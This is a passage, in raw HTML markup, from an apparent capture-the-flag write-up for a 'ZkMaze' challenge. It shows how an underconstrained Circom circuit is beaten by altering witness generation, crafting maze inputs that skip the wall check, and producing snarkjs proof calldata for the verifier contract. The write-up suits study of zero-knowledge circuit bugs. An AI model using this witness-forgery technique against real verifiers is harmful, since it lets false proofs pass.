&lt;&#x2F;span&gt;&lt;span&gt;    tmp_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(tmp_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    out &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;==&lt;&#x2F;span&gt;&lt;span&gt; tmp_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; tmp_y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Modify the &lt;code&gt;tmp_x &lt;&#x2F;code&gt; and &lt;code&gt;tmp_y &lt;&#x2F;code&gt; witness to go around the maze directly. The writing of &lt;code&gt;CheckNotBarrier &lt;&#x2F;code&gt; is also satisfied.&lt;&#x2F;p&gt;
&lt;p&gt;First, generate a wtns where the &lt;code&gt;tmp_x &lt;&#x2F;code&gt; and &lt;code&gt;tmp_y &lt;&#x2F;code&gt; are always 1&lt;&#x2F;p&gt;
&lt;p&gt;Locate the binary position of the witness and modify the reference &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;underconstrained-circom&quot;&gt;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;underconstrained-circom&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However, this question is a bit too restrictive…&lt;&#x2F;p&gt;
&lt;p&gt;Directly modify &lt;code&gt;tmp_x &amp;lt; -- pos_x &amp;gt; = 0 &amp;amp; &amp;amp; pos_x &amp;lt; n; &lt;&#x2F;code&gt; to &lt;code&gt;tmp_x &amp;lt; -- 1 &lt;&#x2F;code&gt;,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;PS C:\Users\xxxxx\ZkMaze&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; snarkjs r1cs print .\out\maze.r1cs .\out\maze.sym &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; .\out\constraints.out
&lt;&#x2F;span&gt;&lt;span&gt;PS C:\Users\xxxxx\ZkMaze&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; certutil &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;hashfile .\out\constraints.out
&lt;&#x2F;span&gt;&lt;span&gt;SHA1 的 .\out\constraints.out 哈希:
&lt;&#x2F;span&gt;&lt;span&gt;ad080ba683ef5ea32328f277366465a389adb87c
&lt;&#x2F;span&gt;&lt;span&gt;CertUtil: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;hashfile 命令成功完成。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Verified that there is no change in contraints. Then directly generate according to the modified circom compile, and then generate witness.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;node generate_witness.js maze.wasm input.json witness.wtns
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Found that going around from the top left will hit the wall in the lower right corner. Because &lt;code&gt;1 * 5 + (-1) == 4&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;answer&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;goal&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;maze&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Don’t want to write code… anyway, the numbers are small, just draw by hand could found &lt;code&gt;5 *5 - 1 == 24&lt;&#x2F;code&gt; would be a solution.&lt;&#x2F;p&gt;
&lt;p&gt;As shown in the picture, you should go directly to the upper left&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;answer&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;goal&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;maze&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The rest is interaction &lt;a href=&quot;https:&#x2F;&#x2F;docs.circom.io&#x2F;getting-started&#x2F;proving-circuits&#x2F;#verifying-from-a-smart-contract&quot;&gt;https:&#x2F;&#x2F;docs.circom.io&#x2F;getting-started&#x2F;proving-circuits&#x2F;#verifying-from-a-smart-contract&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;snarkjs generatecall
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;You can also repeat the steps of &lt;a href=&quot;https:&#x2F;&#x2F;docs.circom.io&#x2F;getting-started&#x2F;proving-circuits&#x2F;&quot;&gt;https:&#x2F;&#x2F;docs.circom.io&#x2F;getting-started&#x2F;proving-circuits&#x2F;&lt;&#x2F;a&gt; and type the generated &lt;code&gt;proof.json &lt;&#x2F;code&gt; by hand&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x02afe3b6af05f5f6322bc9ad5a883bb04074843087ec0358627413e5f168838d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x13e141ab596af7e38b6fb17a5b2f16e899d9fa8cf05e504d42322999f410924d&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;[[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0828a2daaf75f4160abcdb92a458d7db3ab1db83d98bed5ad5964091f3a73758&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x1a6b94a64c03ed6b2668e4fbd3243824ef64c95052460ab84479f2884af3604f&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0035455651cf9dd0d29bc8184609a5cef8171c5434169cf98c8d18520582acf3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x015c09d506fcd7fd20dd82fffa2f3c78f6f95fa2c22234eab265c60f2f4c68c1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x181285ceff213dc0d955aea8282f53f076cd3c9651d833b2b0bbb5ded7a4ca49&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x178d85a5599cc5b6aa74da0bcf829065d2c23f042ee955fe22a4207b66e70856&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000018&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000001&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x0000000000000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span 